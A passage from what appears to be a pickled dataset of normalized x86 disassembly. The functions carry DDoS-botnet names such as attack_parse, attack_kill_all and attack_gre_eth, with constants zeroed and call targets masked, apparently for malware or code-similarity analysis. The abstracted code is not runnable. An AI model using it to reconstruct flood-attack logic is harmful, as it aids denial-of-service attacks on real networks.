\nADD~ESP,0\nMOV~ESI,EAX\nXOR~EAX,EAX\nLEA~EBX,[ESP+0]\nCMP~[ESP+ESI+0],0\nPUSH~0\nPUSH~0\nSETZ~AL\nADD~ESI,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,ESI\nADD~EBX,ESI\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,ESI\nLEA~ESI,[EDX+0]\nMOV~[EAX+EDX-0],0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~[ESP+0],0\nCMP~[EBX+0],0\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~EAX,[ESP+0]\nPUSH~EDX\nSUB~ESI,EAX\nLEA~EAX,[EBX+EAX]\nPUSH~ESI\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nJMP~FOO\nCMP~DL,0\nJZ~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nLEA~ECX,[EBX+EAX]\nMOV~DL,[ECX]\nTEST~DL,DL\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~ESI,[ESP+0]\nPUSH~EAX\nADD~ESI,0\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nPOP~EAX\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nJMP~FOO\nCMP~BYTEPTR[EBX],0\nJNZ~FOO\nMOV~ESI,[ESP+0]\nPUSH~EAX\nADD~ESI,0\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nPOP~EDI\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~ECX\nPUSH~ECX\nADD~EBX,[ESP+0]\nLEA~EAX,[EBX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~BYTEPTR[ECX],0\nJMP~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nXOR~EAX,EAX\nCMP~[ESP+ESI+0],0\nSETZ~AL\nPUSH~0\nADD~ESI,EAX\nPUSH~0\nMOV~EAX,[ESP+0]\nLEA~EDI,[EBX+ESI]\nSUB~EAX,ESI\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EAX,0\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~EAX,ESI\nMOV~[ESP+0],0\nMOV~[EAX+EDX-0],0\nJMP~FOO\nLEA~EAX,[ECX+0]\nMOV~[ESP+0],EAX\nMOV~ECX,[ESP+0]\nLEA~EBX,[EDI+ECX]\nMOV~DL,[EBX]\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJBE~FOO\nTEST~DL,DL\nJZ~FOO\nMOV~BYTEPTR[EBX],0\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDX+0]\nMOV~[ESP+0],EAX\nCMP~BYTEPTR[EDI+EAX],0\nJNZ~FOO\nLEA~EAX,[EDX+0]\nMOV~[ESP+0],EAX\nSUB~ESP,0\nMOV~EAX,EDI\nADD~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nMOV~EAX,EDI\nADD~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,EDI\nADD~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nLEA~EAX,[EDI+EBX]\nPUSH~EAX\nCALL~FOO\nADD~EBX,EAX\nMOV~[ESP+0],EBX\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~BYTEPTR[EDI+EAX],0\nJNZ~FOO\nLEA~EBX,[EAX+0]\nMOV~[ESP+0],EBX\nSUB~ESP,0\nLEA~EBX,[EDI+EBX]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~[EBX+EAX-0],0\nJNZ~FOO\nMOV~EBX,EDI\nADD~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+EAX-0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~EBX,EAX\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nLEA~EAX,[EBX-0]\nADD~ESP,0\nCMP~EAX,0\nJA~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~ESP,0\nADD~EDX,EBX\nCMP~EDX,EAX\nJA~FOO\nMOV~EBX,EDI\nADD~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~[ESP+0],0\nCMP~[EBX+0],0\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~EDX,[ESP+0]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nINC~EAX\nSUB~EAX,EDX\nLEA~EDX,[EBX+EDX]\nPUSH~EAX\nPUSH~EDX\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nJMP~FOO\nCMP~DL,0\nJZ~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nLEA~ECX,[EBX+EAX]\nMOV~DL,[ECX]\nTEST~DL,DL\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~EBX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~BYTEPTR[EBX],0\nJNZ~FOO\nSUB~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~ESI,[ESP+0]\nPUSH~EAX\nADD~ESI,0\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nPOP~EAX\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~EDI\nPUSH~EDI\nADD~EBX,[ESP+0]\nLEA~EAX,[EBX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nMOV~[EBP-0],0\nADD~ESP,0\nJMP~FOO\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nMOV~ESI,EAX\nADD~EBX,0\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOV~[EBP-0],0\nJMP~FOO\nCMP~[ESP+0],ESI\nSETNLE~AL\nLEA~EAX,[EAX+EAX*8+0]\nMOV~[EBP-0],AL\nPUSH~0\nPUSH~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[EBP-0]\nCALL~FOO\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nJMP~FOO\nCMP~[EBP-0],0\nJNZ~FOO\nCMP~[EBP+0],0\nJNZ~FOO\nMOV~EDX,[ESP+0]\nPUSH~EAX\nPUSH~0\nADD~EDX,0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nSUB~[EBP+0],0\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ECX,0\nMOV~EBX,EAX\nMOV~DWORDPTR[EAX],0\nMOV~EAX,0\nMOV~EDX,[EBP+0]\nMOV~[ESP+0],ECX\nSUB~EAX,EDX\nADD~EDX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nPUSH~[EBP-0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~DWORDPTR[EBX],0\nJMP~FOO\nCMP~EAX,0\nJNZ~FOO\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nJMP~FOO\nADD~[EBP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[EBP-0],EAX\nMOV~EAX,[EBP+0]\nTEST~EAX,EAX\nJLE~FOO\nMOV~EDX,[EBP+0]\nMOV~EBX,EAX\nCMP~EAX,EDX\nJLE~FOO\nMOV~EBX,EDX\nSUB~EAX,EBX\nCMP~[EBP+0],0\nMOV~[EBP+0],EAX\nJNZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~EAX\nPUSH~[EBP+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~EAX\nPUSH~[EBP+0]\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDI,[ESP+0]\nADD~ESP,0\nMOV~EBX,EAX\nADD~EDI,EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[EBP+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~EBX,EAX\nMOV~[ESP+0],EBX\nADD~ESP,0\nMOV~[EBX+EDX+0],0\nCMP~[EBP+0],0\nJG~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~ESI,[ESP+0]\nPUSH~EAX\nPUSH~EAX\nPUSH~EDI\nMOV~EAX,[EBP+0]\nADD~ESI,0\nSHL~EAX,0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[EBP+0]\nSHL~EBX,0\nLEA~EBX,[ESI+EBX]\nMOV~[ESP],EBX\nCALL~FOO\nPOP~ECX\nADD~EBX,EAX\nPOP~EDI\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~EBX,[ESP+0]\nMOV~EDI,[ESP+0]\nPUSH~0\nPUSH~0\nADD~EBX,0\nMOV~EAX,[EBP+0]\nADD~EDI,EBX\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~EBX,[ESP+0]\nADD~ESP,0\nMOV~[EBX+EAX+0],0\nMOV~EAX,[EBP+0]\nSHL~EAX,0\nADD~ESI,EAX\nPUSH~ESI\nCALL~FOO\nPOP~EBX\nADD~ESI,EAX\nPOP~EDX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nINC~[EBP+0]\nADD~ESP,0\nMOV~[EBP+0],0\nMOV~[EBP-0],0\nJMP~FOO\nXOR~EBX,EBX\nCMP~[EBP+0],0\nJNZ~FOO\nCMP~[EBP+0],0\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~[EBP+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~0\nPUSH~0\nPUSH~[EBP+0]\nPUSH~[ESP+0]\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,EAX\nMOV~[EAX+ECX+0],0\nPUSH~0\nPUSH~0\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~ESP,0\nMOV~[EAX+EDX+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nADD~EAX,0\nMOV~[EBP+0],EAX\nJMP~FOO\nMOV~EAX,[EBP+0]\nSUB~EAX,EBX\nMOV~[EBP+0],EAX\nTEST~EAX,EAX\nJZ~FOO\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EBP+0]\nSUB~EAX,EBX\nMOV~[EBP+0],EAX\nPUSH~EDX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nADD~EAX,EBX\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,[EBP+0]\nMOV~ECX,[ESP+0]\nADD~ESP,0\nTEST~EAX,EAX\nMOV~[EAX+ECX+0],0\nJZ~FOO\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~DWORDPTR[EBX],0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[EBP-0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nINC~EAX\nJNZ~FOO\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[EBP-0]\nCALL~FOO\nMOV~[EBP-0],0\nMOV~[EBP-0],0\nJMP~FOO\nCMP~[EBP-0],0\nJZ~FOO\nMOV~[EBP-0],0\nINC~[ESP+0]\nADD~EBP,0\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],EAX\nJL~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p14
L6587L
tp15
a(S'attack_get_opt_str'
p16
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~ECX,ECX\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~EDX,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nJMP~FOO\nMOV~AL,[EDX+0]\nMOV~EBX,EDX\nADD~EDX,0\nCMP~AL,[ESP+0]\nJNZ~FOO\nMOV~ESI,[EBX]\nJMP~FOO\nINC~ECX\nMOVZX~EAX,[ESP+0]\nCMP~ECX,EAX\nJL~FOO\nMOV~EAX,ESI\nPOP~EDX\nPOP~EBX\nPOP~ESI\nRETN"'
p17
L67L
tp18
a(S'attack_get_opt_ip'
p19
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],EAX\nPOP~EAX\nPOP~EDX\nPOP~EBX\nJMP~FOO\nMOV~EAX,EBX\nPOP~ECX\nPOP~EBX\nPOP~EBX\nRETN"'
p20
L56L
tp21
a(S'attack_get_opt_int'
p22
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],EAX\nPOP~EAX\nPOP~EDX\nPOP~EBX\nJMP~FOO\nMOV~EAX,EBX\nPOP~ECX\nPOP~EBX\nPOP~EBX\nRETN"'
p23
L64L
tp24
a(S'attack_start'
p25
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[EBP+0]\nMOV~EDI,[EBP+0]\nMOV~[EBP-0],AL\nMOV~ESI,[EBP+0]\nCALL~FOO\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJG~FOO\nCALL~FOO\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOVZX~EBX,<STR>\nMOV~ECX,<STR>\nXOR~EAX,EAX\nMOV~[EBP-0],ECX\nJMP~FOO\nSUB~ESP,0\nPUSH~[EBP+0]\nCALL~FOO\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~0\nPUSH~EAX\nCALL~FOO\nPOP~ECX\nPUSH~0\nCALL~FOO\nPUSH~[EBP+0]\nMOV~ECX,ESI\nMOVZX~EAX,CL\nPUSH~EAX\nMOV~ECX,EDI\nPUSH~[EBP+0]\nMOVZX~EAX,CL\nPUSH~EAX\nCALL~DWORDPTR[EDX]\nADD~ESP,0\nJMP~FOO\nMOV~ECX,[EBP-0]\nMOV~EDX,[ECX+EAX*4]\nMOV~CL,[EBP-0]\nCMP~[EDX+0],CL\nJZ~FOO\nINC~EAX\nCMP~EAX,EBX\nJL~FOO\nSUB~ESP,0\nJMP~FOO\nLEA~ESP,[EBP-0]\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p26
L160L
tp27
a(S'attack_parse'
p28
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBP,[ESP+0]\nMOV~EBX,[ESP+0]\nCMP~EBP,0\nJBE~FOO\nMOV~EAX,[EBX]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nCMP~EBP,0\nMOV~[ESP+0],EAX\nJZ~FOO\nMOV~DL,[EBX+0]\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],DL\nCMP~EBP,0\nJZ~FOO\nMOV~AL,[EAX+0]\nMOV~[ESP+0],AL\nTEST~AL,AL\nJZ~FOO\nMOVZX~ECX,AL\nLEA~EDX,[EBP-0]\nLEA~EAX,[ECX+ECX*4]\nCMP~EDX,EAX\nJB~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ECX\nCALL~FOO\nXOR~ESI,ESI\nMOV~[ESP+0],0\nMOV~EDI,EAX\nXOR~ECX,ECX\nADD~ESP,0\nJMP~FOO\nMOV~EDX,[ESI+EBX+0]\nMOV~[ECX+EDI-0],EDX\nMOV~AL,[ESI+EBX+0]\nMOV~[ECX+EDI-0],0\nMOV~[ECX+EDI-0],AL\nMOV~[ECX+EDI-0],EDX\nINC~[ESP+0]\nMOVZX~EAX,[ESP+0]\nADD~ESI,0\nADD~ECX,0\nMOV~[ESP+0],EAX\nCMP~[ESP+0],EAX\nJL~FOO\nMOV~EDX,EBP\nLEA~EAX,[EBX+ESI]\nSUB~EDX,ESI\nMOV~[ESP+0],0\nCMP~EDX,0\nJZ~FOO\nMOV~CL,[EAX+0]\nMOV~[ESP+0],CL\nTEST~CL,CL\nJZ~FOO\nLEA~EBX,[EAX+0]\nPUSH~EAX\nPUSH~EAX\nLEA~ESI,[EDX-0]\nMOVZX~EAX,CL\nPUSH~0\nPUSH~EAX\nCALL~FOO\nXOR~EBP,EBP\nMOV~[ESP+0],EAX\nJMP~FOO\nTEST~ESI,ESI\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~AL,[EBX]\nCMP~ESI,0\nMOV~[EDX+EBP*8+0],AL\nJZ~FOO\nSUB~ESI,0\nMOV~[ESP+0],ESI\nMOVZX~ESI,[EBX+0]\nCMP~[ESP+0],ESI\nJL~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nADD~EBX,0\nMOV~[ECX+EBP*8],EAX\nPUSH~ESI\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nSUB~EAX,ESI\nADD~EBX,ESI\nINC~EBP\nMOV~ESI,EAX\nADD~ESP,0\nMOVZX~EAX,[ESP+0]\nCMP~EBP,EAX\nJL~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nPUSH~EBP\nPUSH~EBP\nPUSH~[ESP+0]\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDI\nPUSH~[ESP+0]\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~EDI,EDI\nJZ~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nMOVZX~ESI,[ESP+0]\nXOR~EBX,EBX\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+EBX*8]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EBX\nCMP~EBX,ESI\nJL~FOO\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],ECX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p29
L479L
tp30
a(S'attack_kill_all'
p31
S'"PUSH~EBX\nXOR~EBX,EBX\nSUB~ESP,0\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,0\nINC~EBX\nCMP~EBX,0\nJNZ~FOO\nPOP~EAX\nPOP~EDX\nPOP~EBX\nJMP~FOO"'
p32
L55L
tp33
a(S'add_attack'
p34
S'"PUSH~EDI\nMOV~EDI,EDX\nPUSH~ESI\nMOV~ESI,EAX\nPUSH~EBX\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~EAX,ESI\nPOP~ESI\nMOV~[EBX+0],AL\nMOV~[EBX],EDI\nMOVZX~EAX,<STR>\nPOP~EDI\nLEA~EAX,<STR>\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nMOV~DL,<STR>\nMOVZX~ECX,DL\nADD~ESP,0\nINC~EDX\nMOV~[EAX+ECX*4],EBX\nMOV~<STR>,EAX\nPOP~EBX\nMOV~<STR>,DL\nPOP~ESI\nPOP~EDI\nRETN"'
p35
L86L
tp36
a(S'attack_init'
p37
S'"SUB~ESP,0\nMOV~EDX,0\nXOR~EAX,EAX\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EAX,0\nMOV~EDX,0\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nRETN"'
p38
L159L
tp39
a(S'attack_gre_eth'
p40
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],AL\nMOV~BL,[ESP+0]\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EBX,BL\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~<STR>\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nLEA~EAX,[EBX+0]\nLEA~ECX,[EBX+0]\nMOV~[ESP+0],EAX\nMOV~BYTEPTR[EBX],0\nMOV~DL,[ESP+0]\nLEA~ESI,[EBX+0]\nMOV~[EBX+0],DL\nLEA~EBP,[EBX+0]\nMOV~EDI,[ESP+0]\nLEA~EAX,[EDI+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[ECX+0],0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EDX\nMOV~EDX,[ESP+0]\nIMUL~EAX,[ESP+0],0\nMOV~[ECX+0],0\nMOV~EAX,[EAX+EDX+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~AL,[ESP+0]\nMOV~[ESI+0],AL\nLEA~EAX,[EDI+0]\nMOV~DL,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nMOV~[ESI+0],DL\nNOT~EAX\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJZ~FOO\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJZ~FOO\nMOV~EAX,[EBX+0]\nJMP~FOO\nSUB~EAX,0\nNOT~EAX\nMOV~[ESI+0],EAX\nMOV~EAX,[ESP+0]\nINC~[ESP+0]\nROR~AX,0\nMOV~[EBP+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBP+0],AX\nLEA~EAX,[EDI+0]\